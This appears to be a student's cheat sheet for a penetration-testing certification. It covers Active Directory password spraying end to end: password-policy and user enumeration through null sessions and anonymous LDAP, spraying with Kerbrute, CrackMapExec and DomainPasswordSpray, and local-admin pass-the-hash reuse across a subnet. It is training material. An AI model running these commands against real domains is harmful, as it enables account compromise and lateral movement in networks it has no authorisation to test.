---
tags: [cpts, ad, password-spraying, credential-gathering]
---

# 🎯 Password Spraying

> [!important] Rule
> Always pull the password policy and build a clean user list **before** spraying. One password → many accounts, never many passwords → one account.

## 🔐 1. Password Policy

### Credentialed (Linux)
```bash
crackmapexec smb $DC_IP -u $USER -p $PASS --pass-pol
```

### SMB NULL session (Linux)
```bash
rpcclient -U "" -N $DC_IP
```
```text
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

### enum4linux / enum4linux-ng
```bash
enum4linux -P $DC_IP
enum4linux-ng -P $DC_IP -oA $OUTFILE
cat $OUTFILE.json
```

### LDAP anonymous bind
```bash
ldapsearch -H ldap://$DC_IP -x -b "DC=$DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Windows — NULL session
```cmd
net use \\$DC_HOSTNAME\ipc$ "" /u:""
```

### Windows — built-in
```cmd
net accounts
```

### Windows — PowerView
```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

> [!warning] Never assume defaults
> Lockout threshold/duration/observation-window vary per domain and can differ per Fine-Grained Password Policy group. Always confirm before spraying. If policy cannot be obtained: max 1–2 attempts, wait 1+ hour between.

---

## 👥 2. Build a Target User List

| Access | Command |
|---|---|
| SMB NULL — enum4linux | `enum4linux -U $DC_IP \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` |
| SMB NULL — rpcclient | `rpcclient -U "" -N $DC_IP` → `enumdomusers` |
| Credentialed — CME | `crackmapexec smb $DC_IP --users` |
| Credentialed — CME auth | `sudo crackmapexec smb $DC_IP -u $USER -p $PASS --users` |
| LDAP anonymous | `ldapsearch -H ldap://$DC_IP -x -b "DC=$DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "` |
| LDAP anonymous (tool) | `./windapsearch.py --dc-ip $DC_IP -u "" -U` |
| No auth / no anon | `kerbrute userenum -d $DOMAIN --dc $DC_IP $USERLIST` |
| External OSINT | `linkedin2username` → candidate list → validate with Kerbrute |

> [!note] Filter output
> Entries ending `$` are computer accounts — strip before spraying. `badpwdcount`/`baddpwdtime` from CME `--users` flag accounts close to lockout (per-DC state, not global).

---

## 🐧 3. Spray — Linux

```bash
# rpcclient loop (filter on Authority)
for u in $(cat $USERLIST); do rpcclient -U "$u%$PASS" -c "getusername;quit" $DC_IP | grep Authority; done

# Kerbrute
kerbrute passwordspray -d $DOMAIN --dc $DC_IP $USERLIST $PASS

# CrackMapExec
sudo crackmapexec smb $DC_IP -u $USERLIST -p $PASS | grep +

# Validate a hit
sudo crackmapexec smb $DC_IP -u $USER -p $PASS
```

## 🪟 4. Spray — Windows

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password $PASS -OutFile spray_success -ErrorAction SilentlyContinue
```
> Auto-enumerates users, policy, lockout threshold; strips disabled/near-lockout accounts.

```powershell
# Kerbrute is also available on Windows (commonly C:\Tools\kerbrute.exe)
kerbrute.exe passwordspray -d $DOMAIN --dc $DC_IP $USERLIST $PASS
```

---

## 🔑 5. Local Admin Password/Hash Reuse

```bash
sudo crackmapexec smb --local-auth $SUBNET/24 -u administrator -H $NTHASH | grep +
```
> [!important] `--local-auth` is mandatory — without it CME may auth as the domain account and risk domain lockouts.

Pattern-reuse to also check: `desktop%@admin123` vs `server%@admin123`, `bsmith` (local) vs `bsmith` (domain), `ajones` vs `ajones_adm`.

---

## 🧾 6. Quick Reference

```text
RPC    → rpcclient (grep Authority)
Kerberos → Kerbrute (VALID LOGIN)
SMB    → CrackMapExec (grep +)
```

| Technique | Credential | Target | Filter |
|---|---|---|---|
| Domain spray | 1 password | many users | per-tool above |
| Local admin reuse | local admin pass/hash | many hosts | `--local-auth` + `grep +` |

> [!tip] Detection evasion is not the point here
> Maintain a spray log: accounts targeted, DC used, date/time, password(s) tried.

#password-spraying #cpts
